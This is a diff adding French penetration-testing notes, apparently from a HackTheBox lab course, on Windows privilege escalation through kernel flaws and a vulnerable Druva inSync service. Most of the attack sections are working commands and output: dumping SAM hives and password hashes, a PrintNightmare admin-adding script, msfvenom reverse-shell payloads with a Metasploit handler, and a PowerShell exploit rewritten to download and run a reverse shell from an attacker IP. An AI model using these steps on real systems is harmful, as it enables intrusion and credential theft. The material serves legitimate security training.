@@ -1375,12 +1375,316 @@ Si un utilisateur peut modifier le binaire ou la clé, le code s’exécutera à
 - [Windows Registry Permissions - Microsoft Learn](https://learn.microsoft.com/windows/win32/sysinfo/registry-permissions)  
 - [CVE-2019-1322 - Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1322)  
 
+---
 
 
+---
+# Kernel Exploits
+
+Maintenir tous les postes et serveurs Windows à jour est un défi. Même avec SCCM ou WSUS, certaines mises à jour échouent.  
+De nombreuses vulnérabilités du noyau Windows ont été découvertes au fil des années, de Windows XP jusqu’à Windows 10 et Server 2019.  
+Certaines sont des failles **Remote Code Execution (RCE)**, d’autres permettent une **élévation locale de privilèges**.
+
+Il est essentiel de rester à jour sur les correctifs, car de nouvelles vulnérabilités (comme MS17-010) touchent souvent les anciennes versions de Windows.
+
+## Notable Vulnerabilities
+
+### MS08-067
+
+Vulnérabilité RCE dans le service `Server` causée par une mauvaise gestion des requêtes RPC.  
+Permet à un attaquant non authentifié d’exécuter du code arbitraire avec les privilèges `SYSTEM`.
+
+- Affecte : Windows 2000, 2003, 2008, XP et Vista  
+- Exploitable localement si le port 445 (SMB) est bloqué depuis l’extérieur  
+- Disponible via Metasploit (`ms08_067_netapi`)
+
+### MS17-010 (EternalBlue)
+
+Faille dans le protocole `SMBv1` exploitée par le kit **FuzzBunch**.  
+Permet une exécution de code arbitraire avec les privilèges `SYSTEM`.
+
+- Affecte : Windows 7/8/10, Server 2008 → 2016  
+- Exploitable localement pour élever les privilèges si le port 445 est bloqué  
+- Disponible via Metasploit ou scripts standalone
+
+### ALPC Task Scheduler 0-Day
+
+Le service `Task Scheduler` pouvait être exploité pour écrire des DACL arbitraires sur des fichiers `.job`.  
+L’exploitation utilisait la fonction `SchRpcSetSecurity` pour détourner un job et exécuter du code en `SYSTEM`.
 
 
+### CVE-2021-36934 (HiveNightmare / SeriousSam)
 
+Faille Windows 10 donnant aux utilisateurs non privilégiés l’accès en lecture aux fichiers du registre : `SAM`, `SYSTEM`, `SECURITY`.  
+Permet d’extraire les hashs des comptes locaux sans droits administratifs.
 
+#### Checking Permissions on the SAM File
+
+Commande : `icacls c:\Windows\System32\config\SAM`
+
+Exemple de sortie :
+```
+C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)  
+NT AUTHORITY\SYSTEM:(I)(F)  
+BUILTIN\Users:(I)(RX)
+```
+
+→ Le groupe `Users` ayant lecture (`RX`) indique une machine vulnérable.
+
+#### Exploitation avec HiveNightmare.exe
+
+Commande : `.\HiveNightmare.exe`
+
+Exemple de sortie :
+```
+Success: SAM hive ... written out to current working directory as SAM-2021-08-07  
+Success: SECURITY hive ... written out to current working directory as SECURITY-2021-08-07  
+Success: SYSTEM hive ... written out to current working directory as SYSTEM-2021-08-07
+``` 
+
+#### Extraction des hashs avec Impacket
+
+Commande : `impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local`
+
+Exemple :
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::  
+mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
+```
+
+### CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)
+
+Vulnérabilité dans `RpcAddPrinterDriver` permettant à tout utilisateur authentifié d’installer un pilote d’imprimante malveillant.  
+Donne une exécution de code en `SYSTEM`.
+
+#### Vérifier si le Spooler est actif
+
+Commande : `ls \\localhost\pipe\spoolss`
+
+#### Ajouter un admin local avec le PoC PowerShell
+```
+Set-ExecutionPolicy Bypass -Scope Process
+Import-Module .\CVE-2021-1675.ps1
+Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
+```
+Sortie : `[+] added user hacker as local administrator`
+
+#### Vérifier le nouvel utilisateur
+
+Commande : `net user hacker`
+
+## Enumerating Missing Patches
+
+Avant toute exploitation, vérifier les correctifs installés pour identifier les failles potentielles.
+
+### Examining Installed Updates
+
+`systeminfo`  
+`wmic qfe list brief`  
+`Get-Hotfix`  
+
+→ Système probablement en retard sur les mises à jour.
+
+## CVE-2020-0668 – Windows Kernel Elevation of Privilege
+
+Faille dans **Windows Service Tracing** permettant à un utilisateur de déplacer un fichier arbitraire via une opération de renommage exécutée par `SYSTEM`.
+
+### Vérifier les privilèges utilisateur
+
+Commande : `whoami /priv`
+
+Exemple :
+
+`SeChangeNotifyPrivilege  Enabled ` 
+
+### Fichiers générés après compilation
+```
+CVE-2020-0668.exe  
+CVE-2020-0668.exe.config  
+NtApiDotNet.dll  
+```
+
+### Vérifier un service exploitable
+
+Exemple : `Mozilla Maintenance Service`
+
+Commande : `icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`
+
+→ L’utilisateur n’a que lecture, mais la faille permet d’écrire dans le dossier.
+
+### Générer un binaire malveillant
+
+Commande : `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe`
+
+### Héberger le binaire
+
+Commande : `python3 -m http.server 8080`
+
+### Télécharger le binaire sur la cible
+```
+wget http://10.10.15.244:8080/maintenanceservice.exe
+wget http://10.10.15.244:8080/maintenanceservice2.exe
+```
+
+### Exécution de l’exploit
+
+Commande :  
+`C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`
+
+### Vérifier les permissions
+
+`icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`
+
+Sortie : `WINLPE-WS02\htb-student:(F)`  
+→ L’utilisateur a maintenant un **Full Control** sur le binaire.
+
+### Remplacer par le binaire malveillant
+
+Commande :  
+`copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`
+
+### Créer un Metasploit Resource Script
+
+Fichier : `handler.rc`
+```
+use exploit/multi/handler  
+set PAYLOAD windows/x64/meterpreter/reverse_https  
+set LHOST <your_ip>  
+set LPORT 8443  
+exploit
+``` 
+
+Lancer : `sudo msfconsole -r handler.rc`
+
+### Démarrer le service
+
+`net start MozillaMaintenance`
+
+Même si une erreur apparaît (`NET HELPMSG 2186`), la connexion reviendra.
+
+### Session Meterpreter
+meterpreter > hashdump  
+`Administrator:500:...:31d6cfe0d16ae931b73c59d7e0c089c0:::` 
+
+→ L’accès `SYSTEM` est obtenu avec succès.
+
+## Resources
+- [MS17-010 (EternalBlue) – Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/MS17-010)  
+- [PrintNightmare Analysis – Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)  
+- [HiveNightmare PoC – GitHub](https://github.com/GossiTheDog/HiveNightmare)  
+- [CVE-2020-0668 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-0668)  
+
+---
+
+# Vulnerable Services
+
+Même sur des systèmes bien patchés et configurés, il est parfois possible d’élever ses privilèges si l’utilisateur peut installer des logiciels ou si des applications tierces vulnérables sont présentes.  
+Durant un audit, on rencontre souvent de nombreux services sur les postes Windows. Certains peuvent mener à une **élévation en SYSTEM**, d’autres provoquer un **DoS** ou exposer des **informations sensibles** (ex. mots de passe dans des fichiers de config).
+
+## Enumerating Installed Programs
+
+On commence par l’énumération des applications installées :
+
+Commande : `wmic product get name` 
+
+→ L’application **Druva inSync 6.6.3** se distingue : elle est vulnérable à une **injection de commande** via un service RPC exposé (port 6064).  
+Druva inSync est un outil de sauvegarde et conformité, dont le service tourne sous le compte **NT AUTHORITY\SYSTEM**.  
+Une élévation est donc possible en exploitant ce service local.
+
+## Enumerating Local Ports
+
+Vérifions que le service est bien actif :
+
+Commande : `netstat -ano | findstr 6064`
+
+Exemple de sortie :
+```
+TCP 127.0.0.1:6064  0.0.0.0:0  LISTENING  3324  
+TCP 127.0.0.1:6064  127.0.0.1:50274  ESTABLISHED  3324  
+TCP 127.0.0.1:6064  127.0.0.1:50510  TIME_WAIT  0  
+```
+→ Le port **6064** écoute localement, PID **3324**.
+
+## Enumerating Process ID
+
+Identifions le processus correspondant au PID 3324 :
+
+Commande : `get-process -Id 3324`
+
+## Enumerating Running Service
+
+Confirmons avec PowerShell :
+
+Commande : `get-service | ? {$_.DisplayName -like 'Druva*'}`
+
+→ Le service est actif sous `NT AUTHORITY\SYSTEM`.
+
+## Exploitation – Druva inSync Local Privilege Escalation
+
+Voici un PoC PowerShell permettant d’envoyer une commande au service RPC local sur le port 6064 :
+
+```
+$ErrorActionPreference = "Stop"
+
+$cmd = "net user pwnd /add"
+
+$s = New-Object System.Net.Sockets.Socket(
+    [System.Net.Sockets.AddressFamily]::InterNetwork,
+    [System.Net.Sockets.SocketType]::Stream,
+    [System.Net.Sockets.ProtocolType]::Tcp
+)
+$s.Connect("127.0.0.1", 6064)
+
+$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
+$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
+$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
+$length = [System.BitConverter]::GetBytes($command.Length);
+
+$s.Send($header)
+$s.Send($rpcType)
+$s.Send($length)
+$s.Send($command)
+```
+
+Ce script envoie une commande au service Druva via son interface RPC locale.
+
+## Modification du PoC pour un Reverse Shell
+
+On peut modifier la variable `$cmd` pour exécuter une commande de notre choix.  
+Plutôt que d’ajouter un utilisateur local (bruyant), on peut obtenir un reverse shell avec PowerShell.
+
+Télécharger le script **Invoke-PowerShellTcp.ps1** sur la machine d’attaque, le renommer `shell.ps1`, et ajouter à la fin :
+
+`Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443`
+
+Modifier ensuite la ligne du PoC :
+
+`$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"`
+
+## Héberger le Script et Écouter la Connexion
+
+Démarrer un serveur HTTP sur la machine d’attaque :
+
+`python3 -m http.server 8080`
+
+Puis lancer un listener Netcat :
+
+`nc -lvnp 9443`
+
+## Exécution et ÉlÉvation
+
+Sur la cible, modifier la stratégie d’exécution PowerShell :
+
+`Set-ExecutionPolicy Bypass -Scope Process`
+
+Puis exécuter le PoC PowerShell modifié.  
+Si tout se passe bien, un shell SYSTEM se connectera à l’attaquant.
+
+## Ressources
+
+- [Druva inSync Command Injection Advisory](https://www.cvedetails.com/cve/CVE-2020-5752/)  
+- [PowerShell Reverse Shell – Nishang](https://github.com/samratashok/nishang)  
+- [Windows Privilege Escalation Fundamentals – HackTheBox Academy](https://academy.hackthebox.com/)
 
 
 
